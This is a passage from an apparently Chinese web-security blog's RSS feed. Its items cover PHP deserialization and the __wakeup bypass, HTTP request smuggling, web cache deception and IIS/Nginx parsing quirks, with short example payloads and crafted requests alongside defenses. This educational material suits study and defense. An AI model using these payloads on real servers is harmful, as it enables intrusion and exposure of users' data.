punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Demo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;raw value&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;construct
Data&#39;s value is raw value.
destruct
string(44) &amp;quot;O:4:&amp;quot;Demo&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:9:&amp;quot;raw value&amp;quot;;&amp;#125;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把序列化的字符串修改一下后，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unserialize(&#39;O:4:&amp;quot;Demo&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:15:&amp;quot;malicious value&amp;quot;;&amp;#125;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wake up
Data&#39;s value is malicious value.
destruct
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里看到，值被修改了.&lt;/p&gt;
&lt;p&gt;上面是一个  &lt;code&gt;unserialize()&lt;/code&gt;  的简单应用，不难看出，如果  &lt;code&gt;__wakeup()&lt;/code&gt;  或者  &lt;code&gt;__desturct()&lt;/code&gt;  有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。&lt;/p&gt;
&lt;p&gt;那么，在  &lt;code&gt;__wakeup()&lt;/code&gt;  中加入判断是否可以阻止这个漏洞呢？ 在  &lt;code&gt;__wakeup()&lt;/code&gt;  中我们加入一行代码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;raw value&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&gt;&lt;/span&gt;&lt;span class=&#34;token property&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;raw value&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;wake up&amp;lt;br /&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但其实还是可以绕过的，在 PHP5 &amp;lt; 5.6.25， PHP7 &amp;lt; 7.0.10 的版本都存在 wakeup 的漏洞。当反序列化中 object 的个数和之前的个数不等时，wakeup 就会被绕过，于是使用下面的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unserialize(&#39;O:7:&amp;quot;HITCON&amp;quot;:1:&amp;#123;s:4:&amp;quot;data&amp;quot;;s:15:&amp;quot;malicious value&amp;quot;;&amp;#125;&#39;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输出&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Data&#39;s value is malicious value.
destruct
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 wakeup 被绕过，值依旧被修改了。&lt;/p&gt;
&lt;h2 id=&#34;利用点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用点&#34;&gt;#&lt;/a&gt; 利用点&lt;/h2&gt;
&lt;h3 id=&#34;soapclient-原生利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#soapclient-原生利用&#34;&gt;#&lt;/a&gt; SoapClient 原生利用&lt;/h3&gt;
&lt;p&gt;php 中的 SoapClient 类可以创建 soap 数据报文，在非 wsdl 模式下，SoapClient 的实例反序列化的时候会对第二个参数指明的 url 进行 soap 请求，该特性可用于 SSRF。&lt;/p&gt;
&lt;h3 id=&#34;ziparchive-原生利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ziparchive-原生利用&#34;&gt;#&lt;/a&gt; ZipArchive 原生利用&lt;/h3&gt;
&lt;p&gt;php 原生类  &lt;code&gt;ZipArchive::open()&lt;/code&gt;  中的 flag 参数如果设置为  &lt;code&gt;ZipArchive::OVERWRITE&lt;/code&gt;  时，会删除指定文件，该特性在一定条件下可以用于删除文件。&lt;/p&gt;
&lt;h3 id=&#34;session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session&#34;&gt;#&lt;/a&gt; Session&lt;/h3&gt;
&lt;p&gt;PHP 中 session 默认是以文件形式存储的，文件以 sess_sessionid 命名，在 session 一定程度可控的情况下，可通过 session 触发反序列化。&lt;/p&gt;
&lt;h2 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;h3 id=&#34;cve-2016-7124&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-7124&#34;&gt;#&lt;/a&gt; CVE-2016-7124&lt;/h3&gt;
&lt;p&gt;在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性 (变量) 数大于实际的个数时，  &lt;code&gt;__wakeup()&lt;/code&gt;  不会被执行。&lt;/p&gt;
&lt;h1 id=&#34;disable-functions&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#disable-functions&#34;&gt;#&lt;/a&gt; Disable Functions&lt;/h1&gt;
&lt;h2 id=&#34;机制实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#机制实现&#34;&gt;#&lt;/a&gt; 机制实现&lt;/h2&gt;
&lt;p&gt;PHP 中 Disable Function 的实现是在 php-src/Zend/Zend-API.c 中。PHP 在启动时，读取配置文件中禁止的函数，逐一根据禁止的函数名调用  &lt;code&gt;zend_disable_function&lt;/code&gt;  来实现禁止的效果。&lt;/p&gt;
&lt;p&gt;这个函数根据函数名在内置函数列表中找到对应的位置并修改掉，当前版本的代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ZEND_API &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;zend_disable_function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;function_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;size_t&lt;/span&gt; function_name_length&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</guid>
            <title>HTTP请求走私</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/</link>
            <category>网络安全</category>
            <category>HTTP</category>
            <category>服务器</category>
            <pubDate>Sun, 27 Nov 2022 15:47:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;文章&lt;/span&gt; 中被提出。&lt;/p&gt;
&lt;h1 id=&#34;成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#成因&#34;&gt;#&lt;/a&gt; 成因&lt;/h1&gt;
&lt;p&gt;请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即  &lt;code&gt;Content-Length&lt;/code&gt;  和  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CLTE：前端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  头，后端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  头&lt;/li&gt;
&lt;li&gt;TECL：前端服务器使用  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，后端服务器使用  &lt;code&gt;Content-Length&lt;/code&gt;  标头。&lt;/li&gt;
&lt;li&gt;TETE：前端和后端服务器都支持  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击&#34;&gt;#&lt;/a&gt; 攻击&lt;/h1&gt;
&lt;h2 id=&#34;cl不为0的get请求&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl不为0的get请求&#34;&gt;#&lt;/a&gt; CL 不为 0 的 GET 请求&lt;/h2&gt;
&lt;p&gt;当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的  &lt;code&gt;Content-Length&lt;/code&gt;  头，不进行处理。例如下面这个例子：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;前端服务器处理了  &lt;code&gt;Content-Length&lt;/code&gt;  ，而后端服务器没有处理  &lt;code&gt;Content-Length&lt;/code&gt;  ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。&lt;/p&gt;
&lt;h2 id=&#34;cl-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-cl&#34;&gt;#&lt;/a&gt; CL-CL&lt;/h2&gt;
&lt;p&gt;根据 RFC 7230，当服务器收到的请求中包含两个  &lt;code&gt;Content-Length&lt;/code&gt;  ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的  &lt;code&gt;Content-Length&lt;/code&gt;  值时，就会出现漏洞。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 就会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;cl-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cl-te&#34;&gt;#&lt;/a&gt; CL-TE&lt;/h2&gt;
&lt;p&gt;CL-TE 指前端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉  &lt;code&gt;Content-Length&lt;/code&gt;  ，处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个例子中 a 同样会被带入下一个请求，变为  &lt;code&gt;aGET / HTTP/1.1\r\n&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;te-cl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-cl&#34;&gt;#&lt;/a&gt; TE-CL&lt;/h2&gt;
&lt;p&gt;TE-CL 指前端服务器处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，而后端服务器处理  &lt;code&gt;Content-Length&lt;/code&gt;  请求头。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;te-te&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#te-te&#34;&gt;#&lt;/a&gt; TE-TE&lt;/h2&gt;
&lt;p&gt;TE-TE 指前后端服务器都处理  &lt;code&gt;Transfer-Encoding&lt;/code&gt;  请求头，但是在容错性上表现不同，例如有的服务器可能会处理  &lt;code&gt;Transfer-encoding&lt;/code&gt;  ，测试例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;禁用后端连接重用&lt;/li&gt;
&lt;li&gt;确保连接中的所有服务器具有相同的配置&lt;/li&gt;
&lt;li&gt;拒绝有二义性的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;h2 id=&#34;rfc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rfc&#34;&gt;#&lt;/a&gt; RFC&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI2MTY=&#34;&gt;RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzA=&#34;&gt;RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;blog-whitepaper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blog-whitepaper&#34;&gt;#&lt;/a&gt; Blog / Whitepaper&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==&#34;&gt;HTTP Request Smuggling by chaiml&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5n&#34;&gt;HTTP request smuggling by portswigger&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY1NA==&#34;&gt;从一道题到协议层攻击之 HTTP 请求走私&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9XZWRuZXNkYXkvdXMtMjAtS2xlaW4tSFRUUC1SZXF1ZXN0LVNtdWdnbGluZy1Jbi0yMDIwLU5ldy1WYXJpYW50cy1OZXctRGVmZW5zZXMtQW5kLU5ldy1DaGFsbGVuZ2VzLnBkZg==&#34;&gt;HTTP Request Smuggling in 2020&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sYWJzLmJpc2hvcGZveC5jb20vdGVjaC1ibG9nL2gyYy1zbXVnZ2xpbmctcmVxdWVzdC1zbXVnZ2xpbmctdmlhLWh0dHAvMi1jbGVhcnRleHQtaDJj&#34;&gt;h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</guid>
            <title>Web Cache欺骗攻击</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Cache</category>
            <pubDate>Sun, 27 Nov 2022 15:42:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。&lt;/p&gt;
&lt;p&gt;例如，网站  &lt;code&gt;htttp://www.example.com&lt;/code&gt;  配置了反向代理。对于那些包含用户个人信息的页面，如  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP 缓存头。&lt;/p&gt;
&lt;p&gt;Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容，同时 URL 地址仍然是  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt; ，http 头的内容也与直接访问  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  相同，cacheing header、content-type（此处为 text/html）也相同。&lt;/p&gt;
&lt;h1 id=&#34;漏洞成因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞成因&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h1&gt;
&lt;p&gt;当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  时，会发生什么呢？整个响应流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;浏览器请求  &lt;code&gt;http://www.example.com/home.php/no-existent.css&lt;/code&gt;  ;&lt;/li&gt;
&lt;li&gt;服务器返回  &lt;code&gt;http://www.example.com/home.php&lt;/code&gt;  的内容 (通常来说不会缓存该页面);&lt;/li&gt;
&lt;li&gt;响应经过代理服务器；&lt;/li&gt;
&lt;li&gt;代理识别该文件有 css 后缀；&lt;/li&gt;
&lt;li&gt;在缓存目录下，代理服务器创建目录  &lt;code&gt;home.php&lt;/code&gt;  ，将返回的内容作为  &lt;code&gt;non-existent.css&lt;/code&gt;  保存。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h1&gt;
&lt;p&gt;攻击者欺骗用户访问  &lt;code&gt;http://www.example.com/home.php/logo.png?www.myhack58.com&lt;/code&gt;  , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。&lt;/p&gt;
&lt;h1 id=&#34;漏洞存在的条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞存在的条件&#34;&gt;#&lt;/a&gt; 漏洞存在的条件&lt;/h1&gt;
&lt;p&gt;漏洞要存在，至少需要满足下面两个条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;web cache 功能根据扩展进行保存，并忽略 caching header;&lt;/li&gt;
&lt;li&gt;当访问如  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  不存在的页面，会返回  &lt;code&gt;home.php&lt;/code&gt;  的内容。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;漏洞防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞防御&#34;&gt;#&lt;/a&gt; 漏洞防御&lt;/h1&gt;
&lt;p&gt;防御措施主要包括 3 点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题；&lt;/li&gt;
&lt;li&gt;如果缓存组件提供选项，设置为根据 content-type 进行缓存；&lt;/li&gt;
&lt;li&gt;访问  &lt;code&gt;http://www.example.com/home.php/non-existent.css&lt;/code&gt;  这类不存在页面，不返回  &lt;code&gt;home.php&lt;/code&gt;  的内容，而返回 404 或者 302。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-cache欺骗攻击实例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-cache欺骗攻击实例&#34;&gt;#&lt;/a&gt; Web Cache 欺骗攻击实例&lt;/h1&gt;
&lt;h2 id=&#34;paypal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#paypal&#34;&gt;#&lt;/a&gt; Paypal&lt;/h2&gt;
&lt;p&gt;Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。 受该攻击的部分页面包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/home/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://www.paypal.com/myaccount/settings/notifications/attack.css&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details&lt;/code&gt;  。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==&#34;&gt;practical web cache poisoning&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MTgvcHJlc2VudGF0aW9uL2hhbw==&#34;&gt;End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
            <title>中间件</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
            <category>网络安全</category>
            <category>中间件</category>
            <category>IIS</category>
            <category>Apache</category>
            <category>Nginx</category>
            <pubDate>Sun, 27 Nov 2022 10:59:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;iis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis&#34;&gt;#&lt;/a&gt; IIS&lt;/h1&gt;
&lt;h2 id=&#34;iis-60&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-60&#34;&gt;#&lt;/a&gt; IIS 6.0&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;后缀解析  &lt;code&gt;/xx.asp;.jpg&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务器默认不解析  &lt;code&gt;;&lt;/code&gt;  号及其后面的内容，相当于截断。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目录解析  &lt;code&gt;/xx.asp/xx.jpg&lt;/code&gt;  (xx.asp 目录下任意解析)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;默认解析  &lt;code&gt;xx.asa&lt;/code&gt;   &lt;code&gt;xx.cer&lt;/code&gt;   &lt;code&gt;xx.cdx&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PROPFIND 栈溢出漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RCE CVE-2017-7269&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iis-70-75-nginx-0837&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#iis-70-75-nginx-0837&#34;&gt;#&lt;/a&gt; IIS 7.0-7.5 / Nginx &amp;lt;= 0.8.37&lt;/h2&gt;
